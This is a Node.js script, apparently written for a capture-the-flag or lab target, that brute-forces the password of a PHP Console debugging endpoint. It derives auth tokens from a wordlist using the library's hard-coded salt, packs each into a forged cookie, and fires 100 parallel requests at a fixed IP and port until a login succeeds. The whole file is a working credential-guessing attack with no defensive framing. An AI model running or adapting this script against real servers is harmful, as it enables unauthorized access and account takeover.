const http = require('http');
const crypto = require('crypto');
const fs = require('fs');

// Set options based on target server
const PUBLIC_KEY = '816e98e88e5ac908406f60be3fb7287e9dbdbbfa4689fe58da4541cb8c7abf1b';
const WORD_LIST = './top10000.txt'

// Settings
const PARALLEL_REQUESTS = 100;
let passwords = [];

function loadPasswords() {
    const file = fs.readFileSync(WORD_LIST, { encoding: 'utf-8' });
    passwords = file.split('\n');
}

function getToken(password) {
    const hash = crypto.createHash('sha256').update(password + 'NeverChangeIt:)').digest('hex');
    return crypto.createHash('sha256').update(hash + PUBLIC_KEY).digest('hex');
}

function getCookieValue(password) {
    var payload = {
        "php-console-client": 5,
        "auth": {
            "publicKey": PUBLIC_KEY,
            "token": getToken(password),
        }
    };

    return Buffer.from(JSON.stringify(payload)).toString('base64');
}

function isValidLogin(headers) {
    return headers['php-console'].indexOf('\"isSuccess\":false') == -1;
}

function makeRequest(password) {
    const options = {
        hostname: '167.172.52.58',
        port: 30558,
        method: 'GET',
        headers: {
            'Cookie': 'php-console-server=5; php-console-client=' + getCookieValue(password),
        }
    };

    return new Promise((resolve) => {
        const req = http.request(options, (res) => {
            resolve({ login: isValidLogin(res.headers), pass: password });
        });
        req.on('error', () => {
            // Ignore
        });
        req.end();
    });
}


(() => {
    let done = false;
    let intervalID;
    const queue = [];
    loadPasswords();

    function run() {
        if (!passwords.length) {
            done = true;
        }

        if (done) {
            clearInterval(intervalID);
            return;
        }
        const queueCap = PARALLEL_REQUESTS - queue.length;
        if (queueCap < 0) {
            return;
        }

        for (let a = 0; a < queueCap; a++) {
            if (!passwords.length) {
                break;
            }

            const pass = passwords.pop();
            makeRequest(pass).then((result) => {
                if (result.login) {
                    done = true;
                    console.log('Password:', result.pass);
                }
            });
        }
    }
    intervalID = setInterval(run, 10);
    run();
})();
